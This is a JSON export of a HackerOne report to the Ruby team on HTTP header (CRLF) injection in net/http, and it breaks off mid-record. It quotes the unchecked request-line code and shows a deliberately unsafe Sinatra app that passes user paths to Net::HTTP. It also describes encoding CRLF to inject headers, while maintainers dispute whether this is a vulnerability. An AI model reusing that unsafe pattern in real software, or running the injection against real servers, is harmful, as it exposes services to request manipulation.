{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "informative", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "bobrov", 
        "rbcafe", 
        "spetr0x", 
        "hi_ztz"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 146416, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-06-24T08:20:42.915Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Ruby:HTTP Header injection in 'net/http'", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Informative", 
    "public": true, 
    "attachments": [
        {
            "file_name": "123123.png", 
            "type": "image/jpeg", 
            "id": 100918, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/918/7b7d13febcf1981da6154a3813ea2fb9fa631290/123123.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224301Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0c5cf409d1bebb50e2d77bd7a6c47293840fa90bf73524cc8b857bf937c93e9b"
        }, 
        {
            "file_name": "222333.png", 
            "type": "image/jpeg", 
            "id": 100919, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/919/2c568749f0b375686b0b23366eda8989332f1114/222333.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224301Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=85100bac936a79a8f57b89a45c706ae18b2625848769d6b70b197159df78d74e"
        }, 
        {
            "file_name": "4444.png", 
            "type": "image/jpeg", 
            "id": 100920, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/920/51dc9ad18ecf75f937229311a374f32cd08a11bc/4444.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224301Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0143c162336d5eff4937dd7dd5ba65068c3e780de577c7cdc7722c34fa008b66"
        }, 
        {
            "file_name": "5555.png", 
            "type": "image/jpeg", 
            "id": 100921, 
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/100/921/6cee949a6cfe9a176c7fafcb1904c3978a1cf6d0/5555.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRM4X5HG%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T224301Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDDs%2B%2FH8tFp9eaL3SuyK3A4v0Gz1Pk4vLeyx%2Fa%2BOUYIBLln%2BHhEjo8aKsDgcWA0AVPWHQ1CqE69K0fwPJtemp0NnMHwpItZaKfQu2ndzpg6QamoxmJU6CxIEWtJEY3Xtdf2COsdrDtLDojEJ9Bsgq2dXSYC00tKxrlTs4yvW6oAYTu01sZU0MCDpTX84p3oRDZuLOTobhBvHMBRwkOe5yM9PnearXzpjHD9w6d9G0IdijQ15s%2Br%2FCrRq1RQ6%2FGlZaDOuMAFvLZ%2BDU%2BQ4elR42FJO7oqNOhTb7xFUKWMGUZD2l9vrtaQYBWgy8vLJL1PHKNL79uTgKO2gWJuruy5%2FR7g8iF%2F%2BDA%2FXyg6nD5MjJy8mSf4BsfZTsJ7bQ%2BmI19CRcsvBZU%2BD1gUjQkVgOsXdeI4LcCwhSIkIHIAnZLc3YhPCinZgj4lT9UYAmI6j6Ig003H%2B2wt4Gf4YVmv60G6zU1H8wWbJ%2Fm9tXcPEMDdtt2yoQpjl%2FLHFVDNhvjZwxcRsctZU64Qaim%2FPjSts6oYmu4TCHG6yWfeMPRxHXWIQV8xe%2BCLaMnof047dAbkRq5Dx8XgGLGEXX%2FVUX%2F8kf%2FiekmYRSZTqEyMUolrmm4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ef6a5c49c7c7cd8670dab63017e8af378f73f49440584a3be7e641e06e07b699"
        }
    ], 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-06-22T08:59:32.371Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-22T08:59:32.371Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "The problem is this line in lib/net/http/generic_request.rb:324\n\n```ruby\n  def write_header(sock, ver, path)\n    buf = \"#{@method} #{path} HTTP/#{ver}\\r\\n\"\n    each_capitalized do |k,v|\n      buf << \"#{k}: #{v}\\r\\n\"\n    end\n    buf << \"\\r\\n\"\n    sock.write buf\n  end\n```\n\n`\"#{@method} #{path} HTTP/#{ver}\\r\\n\"` should be checked here to avoid malicious input\n", 
            "markdown_message": "<p>The problem is this line in lib/net/http/generic_request.rb:324</p>\n<pre class=\"highlight ruby\"><code>  <span class=\"k\">def</span> <span class=\"nf\">write_header</span><span class=\"p\">(</span><span class=\"n\">sock</span><span class=\"p\">,</span> <span class=\"n\">ver</span><span class=\"p\">,</span> <span class=\"n\">path</span><span class=\"p\">)</span>\n    <span class=\"n\">buf</span> <span class=\"o\">=</span> <span class=\"s2\">&quot;</span><span class=\"si\">#{</span><span class=\"vi\">@method</span><span class=\"si\">}</span><span class=\"s2\"> </span><span class=\"si\">#{</span><span class=\"n\">path</span><span class=\"si\">}</span><span class=\"s2\"> HTTP/</span><span class=\"si\">#{</span><span class=\"n\">ver</span><span class=\"si\">}</span><span class=\"se\">\\r\\n</span><span class=\"s2\">&quot;</span>\n    <span class=\"n\">each_capitalized</span> <span class=\"k\">do</span> <span class=\"o\">|</span><span class=\"n\">k</span><span class=\"p\">,</span><span class=\"n\">v</span><span class=\"o\">|</span>\n      <span class=\"n\">buf</span> <span class=\"o\">&lt;&lt;</span> <span class=\"s2\">&quot;</span><span class=\"si\">#{</span><span class=\"n\">k</span><span class=\"si\">}</span><span class=\"s2\">: </span><span class=\"si\">#{</span><span class=\"n\">v</span><span class=\"si\">}</span><span class=\"se\">\\r\\n</span><span class=\"s2\">&quot;</span>\n    <span class=\"k\">end</span>\n    <span class=\"n\">buf</span> <span class=\"o\">&lt;&lt;</span> <span class=\"s2\">&quot;</span><span class=\"se\">\\r\\n</span><span class=\"s2\">&quot;</span>\n    <span class=\"n\">sock</span><span class=\"p\">.</span><span class=\"nf\">write</span> <span class=\"n\">buf</span>\n  <span class=\"k\">end</span>\n</code></pre>\n<p><code>&quot;#{@method} #{path} HTTP/#{ver}\\r\\n&quot;</code> should be checked here to avoid malicious input</p>\n", 
            "type": "Activities::Comment", 
            "id": 1027895, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T01:01:54.660Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T01:01:54.660Z", 
            "actor": {
                "username": "shugo", 
                "url": "/shugo", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/177/f64d7a369fcf4f7abe5e9bb6fdf66be75d94bedd_medium.jpg?1465358284"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Thanks for your report.\n\nWe don't consider this a vulnerability because Net::HTTP#get is not designed to accept malicious input.\nApplications have responsibility to verify input syntactically and semantically (accepting all RFC2616-compliant input would not be a good idea).\n\nSo we would like to handle this as a normal issue.", 
            "markdown_message": "<p>Thanks for your report.</p>\n\n<p>We don&#39;t consider this a vulnerability because Net::HTTP#get is not designed to accept malicious input.<br>\nApplications have responsibility to verify input syntactically and semantically (accepting all RFC2616-compliant input would not be a good idea).</p>\n\n<p>So we would like to handle this as a normal issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1031083, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T06:58:50.665Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T06:58:50.665Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Hi shugo,\n\nThanks for the reply. Please don't leave this problem to developers, they have uneven level at developing. \n\nFor example, assume we have a demo website, the only thing do is generate a new HTTP request:\n\n```ruby\n#!/usr/bin/env ruby\nrequire 'sinatra'\n\nget '/' do\n  'hello world'\nend\n\npost '/' do\n  ip = params[:ip]\n  port = params[:port]\n  path = params[:path]\n\n  # send the request to another site\n  http = Net::HTTP.new ip, port.to_i\n  res = http.get path\n\n  res.body\nend\n```\n\nIt's a common demand, right ?\n\nBut web developer may not realized that __sinatra__ will auto decode url. \nAttacker can encode __\\r\\n__ to __%0a%0d__, send to the __sinatra__, __sinatra__ will decode url to __\\r\\n__ and pass to the __path__, finally cause a HTTP Header Injection or CRLF Injection.\n\nPlease assume all input is malicious. Here is a similar vulnerability in python: [CVE-2016-5699](http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html)\n \nHere is  what another HTTP lib  __Faraday__ do may change your mind.\n\nlib/faraday/connection.rb:308\n\n```ruby\ndef url_prefix=(url, encoder = nil)\n  uri = url_prefix = Utils.URI(url)\n  self.path_prefix = uri.path\n  # ... ... ...\n  uri\nend\n```\n\n`uri = url_prefix = Utils.URI(url)` try to convert `url` to __URI__, It will raise an error when `url` is invalid.\n\nlib/faraday/connection.rb:399\n\n```ruby\ndef build_exclusive_url(url = nil, params = nil, params_encoder = nil)\n  url = nil if url.respond_to?(:empty?) and url.empty?\n  base = url_prefix\n  # ... ... ...\n  uri = url ? base + url : base\n  # ... ... ...\nend\n```\n\n`uri = url ? base + url : base` will trigger another examination `convert_to_uri`:\n\n```ruby\ndef convert_to_uri(uri)\n  if uri.is_a?(URI::Generic)\n    uri\n  elsif uri = String.try_convert(uri)\n    parse(uri)\n  else\n    raise ArgumentError,\n          \"bad argument (expected URI object or URI string)\"\n  end\nend\n```\n\nIf url is invalid, it will raise an error.\n\nPlease let me know if you need more info.", 
            "markdown_message": "<p>Hi shugo,</p>\n\n<p>Thanks for the reply. Please don&#39;t leave this problem to developers, they have uneven level at developing. </p>\n\n<p>For example, assume we have a demo website, the only thing do is generate a new HTTP request:</p>\n<pre class=\"highlight ruby\"><code><span class=\"c1\">#!/usr/bin/env ruby</span>\n<span class=\"nb\">require</span> <span class=\"s1\">&#39;sinatra&#39;</span>\n\n<span class=\"n\">get</span> <span class=\"s1\">&#39;/&#39;</span> <span class=\"k\">do</span>\n  <span class=\"s1\">&#39;hello world&#39;</span>\n<span class=\"k\">end</span>\n\n<span class=\"n\">post</span> <span class=\"s1\">&#39;/&#39;</span> <span class=\"k\">do</span>\n  <span class=\"n\">ip</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:ip</span><span class=\"p\">]</span>\n  <span class=\"n\">port</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:port</span><span class=\"p\">]</span>\n  <span class=\"n\">path</span> <span class=\"o\">=</span> <span class=\"n\">params</span><span class=\"p\">[</span><span class=\"ss\">:path</span><span class=\"p\">]</span>\n\n  <span class=\"c1\"># send the request to another site</span>\n  <span class=\"n\">http</span> <span class=\"o\">=</span> <span class=\"no\">Net</span><span class=\"o\">::</span><span class=\"no\">HTTP</span><span class=\"p\">.</span><span class=\"nf\">new</span> <span class=\"n\">ip</span><span class=\"p\">,</span> <span class=\"n\">port</span><span class=\"p\">.</span><span class=\"nf\">to_i</span>\n  <span class=\"n\">res</span> <span class=\"o\">=</span> <span class=\"n\">http</span><span class=\"p\">.</span><span class=\"nf\">get</span> <span class=\"n\">path</span>\n\n  <span class=\"n\">res</span><span class=\"p\">.</span><span class=\"nf\">body</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>It&#39;s a common demand, right ?</p>\n\n<p>But web developer may not realized that <strong>sinatra</strong> will auto decode url. <br>\nAttacker can encode <strong>\\r\\n</strong> to <strong>%0a%0d</strong>, send to the <strong>sinatra</strong>, <strong>sinatra</strong> will decode url to <strong>\\r\\n</strong> and pass to the <strong>path</strong>, finally cause a HTTP Header Injection or CRLF Injection.</p>\n\n<p>Please assume all input is malicious. Here is a similar vulnerability in python: <a href=\"/redirect?signature=43b74c71cadbdde0907d11e2d924291a0bede15f&amp;url=http%3A%2F%2Fblog.blindspotsecurity.com%2F2016%2F06%2Fadvisory-http-header-injection-in.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>CVE-2016-5699</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Here is  what another HTTP lib  <strong>Faraday</strong> do may change your mind.</p>\n\n<p>lib/faraday/connection.rb:308</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">url_prefix</span><span class=\"o\">=</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">,</span> <span class=\"n\">encoder</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span><span class=\"p\">)</span>\n  <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">url_prefix</span> <span class=\"o\">=</span> <span class=\"no\">Utils</span><span class=\"o\">.</span><span class=\"no\">URI</span><span class=\"p\">(</span><span class=\"n\">url</span><span class=\"p\">)</span>\n  <span class=\"nb\">self</span><span class=\"p\">.</span><span class=\"nf\">path_prefix</span> <span class=\"o\">=</span> <span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">path</span>\n  <span class=\"c1\"># ... ... ...</span>\n  <span class=\"n\">uri</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p><code>uri = url_prefix = Utils.URI(url)</code> try to convert <code>url</code> to <strong>URI</strong>, It will raise an error when <code>url</code> is invalid.</p>\n\n<p>lib/faraday/connection.rb:399</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">build_exclusive_url</span><span class=\"p\">(</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span><span class=\"p\">,</span> <span class=\"n\">params</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span><span class=\"p\">,</span> <span class=\"n\">params_encoder</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span><span class=\"p\">)</span>\n  <span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"kp\">nil</span> <span class=\"k\">if</span> <span class=\"n\">url</span><span class=\"p\">.</span><span class=\"nf\">respond_to?</span><span class=\"p\">(</span><span class=\"ss\">:empty?</span><span class=\"p\">)</span> <span class=\"n\">and</span> <span class=\"n\">url</span><span class=\"p\">.</span><span class=\"nf\">empty?</span>\n  <span class=\"n\">base</span> <span class=\"o\">=</span> <span class=\"n\">url_prefix</span>\n  <span class=\"c1\"># ... ... ...</span>\n  <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"n\">url</span> <span class=\"p\">?</span> <span class=\"n\">base</span> <span class=\"o\">+</span> <span class=\"n\">url</span> <span class=\"p\">:</span> <span class=\"n\">base</span>\n  <span class=\"c1\"># ... ... ...</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p><code>uri = url ? base + url : base</code> will trigger another examination <code>convert_to_uri</code>:</p>\n<pre class=\"highlight ruby\"><code><span class=\"k\">def</span> <span class=\"nf\">convert_to_uri</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">)</span>\n  <span class=\"k\">if</span> <span class=\"n\">uri</span><span class=\"p\">.</span><span class=\"nf\">is_a?</span><span class=\"p\">(</span><span class=\"no\">URI</span><span class=\"o\">::</span><span class=\"no\">Generic</span><span class=\"p\">)</span>\n    <span class=\"n\">uri</span>\n  <span class=\"k\">elsif</span> <span class=\"n\">uri</span> <span class=\"o\">=</span> <span class=\"no\">String</span><span class=\"p\">.</span><span class=\"nf\">try_convert</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">)</span>\n    <span class=\"n\">parse</span><span class=\"p\">(</span><span class=\"n\">uri</span><span class=\"p\">)</span>\n  <span class=\"k\">else</span>\n    <span class=\"k\">raise</span> <span class=\"no\">ArgumentError</span><span class=\"p\">,</span>\n          <span class=\"s2\">&quot;bad argument (expected URI object or URI string)&quot;</span>\n  <span class=\"k\">end</span>\n<span class=\"k\">end</span>\n</code></pre>\n<p>If url is invalid, it will raise an error.</p>\n\n<p>Please let me know if you need more info.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033509, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T07:05:44.063Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T07:05:44.063Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "> It's a common demand, right ?\n\nI'm not sure about that.\n\nI think this is a bug we should probably address, but I don't think we should consider this a vulnerability.  Fetching arbitrary paths from user input seems pretty dubious.", 
            "markdown_message": "<blockquote>\n<p>It&#39;s a common demand, right ?</p>\n</blockquote>\n\n<p>I&#39;m not sure about that.</p>\n\n<p>I think this is a bug we should probably address, but I don&#39;t think we should consider this a vulnerability.  Fetching arbitrary paths from user input seems pretty dubious.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033513, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T07:25:00.360Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T07:25:00.360Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "Hi tenderlove,\n\nHere is my point :\nAll input can not be trusted.\n\nWe should validate url in Net::HTTP", 
            "markdown_message": "<p>Hi tenderlove,</p>\n\n<p>Here is my point :<br>\nAll input can not be trusted.</p>\n\n<p>We should validate url in Net::HTTP</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033525, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T07:28:46.260Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T07:28:46.260Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "> All input can not be trusted.\n\nYes, people should be *whitelisting* paths passed in.  An open proxy is already a vulnerability, regardless of header injection.\n\nAs I said, we should treat this as a bug.  But since an open proxy is already a security problem (that we cannot fix), then I don't think this bug should be treated as a security issue.", 
            "markdown_message": "<blockquote>\n<p>All input can not be trusted.</p>\n</blockquote>\n\n<p>Yes, people should be <em>whitelisting</em> paths passed in.  An open proxy is already a vulnerability, regardless of header injection.</p>\n\n<p>As I said, we should treat this as a bug.  But since an open proxy is already a security problem (that we cannot fix), then I don&#39;t think this bug should be treated as a security issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033528, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:06:40.871Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:06:40.871Z", 
            "actor": {
                "username": "shugo", 
                "url": "/shugo", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/076/177/f64d7a369fcf4f7abe5e9bb6fdf66be75d94bedd_medium.jpg?1465358284"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "> But web developer may not realized that sinatra will auto decode url. \n> Attacker can encode \\r\\n to %0a%0d, send to the sinatra, sinatra will decode url to \\r\\n and pass to the path, finally cause a HTTP Header Injection or CRLF Injection.\n\nIn that case, it seems to be a bug of that application, not Net::HTTP#get.\n\nI'm not against adding argument verification to Net::HTTP#get, though.\n", 
            "markdown_message": "<blockquote>\n<p>But web developer may not realized that sinatra will auto decode url. <br>\nAttacker can encode \\r\\n to %0a%0d, send to the sinatra, sinatra will decode url to \\r\\n and pass to the path, finally cause a HTTP Header Injection or CRLF Injection.</p>\n</blockquote>\n\n<p>In that case, it seems to be a bug of that application, not Net::HTTP#get.</p>\n\n<p>I&#39;m not against adding argument verification to Net::HTTP#get, though.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033543, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:11:42.724Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:11:42.724Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "> But since an open proxy is already a security problem\n\nYes, an open proxy is already a vulnerability and you can't fix that, but attack scenarios is not only include an open proxy, but also include many other parts.\n\nA site like google image, user can paste image url on it, then site will request the resource. It's possible to suffer this attack.\n\nSome video sites allow user reference outside resource. It's possible to suffer this attack.\n\nSo you can not treat it occur in an unusual scenarios. I still consider it was a security issue.\n", 
            "markdown_message": "<blockquote>\n<p>But since an open proxy is already a security problem</p>\n</blockquote>\n\n<p>Yes, an open proxy is already a vulnerability and you can&#39;t fix that, but attack scenarios is not only include an open proxy, but also include many other parts.</p>\n\n<p>A site like google image, user can paste image url on it, then site will request the resource. It&#39;s possible to suffer this attack.</p>\n\n<p>Some video sites allow user reference outside resource. It&#39;s possible to suffer this attack.</p>\n\n<p>So you can not treat it occur in an unusual scenarios. I still consider it was a security issue.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033548, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:13:19.243Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:13:19.243Z", 
            "actor": {
                "username": "rootredrain", 
                "url": "/rootredrain", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/070/636/ce69f97329a91d9ee85ec2a82758aa0eb74d500c_medium.jpg?1466586493"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "If you believe this is not a issue, please allow the public disclosure.", 
            "markdown_message": "<p>If you believe this is not a issue, please allow the public disclosure.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1033549, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-24T08:17:39.517Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-24T08:17:39.517Z", 
            "actor": {
                "username": "tenderlove", 
                "url": "/tenderlove", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/318/4b00c3dfa514b00e4c7c2751c97ca93d0f0d7160_medium.png?1393998446"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ruby", 
            "message": "I've closed as informative, and I'll allow public disclosure.", 
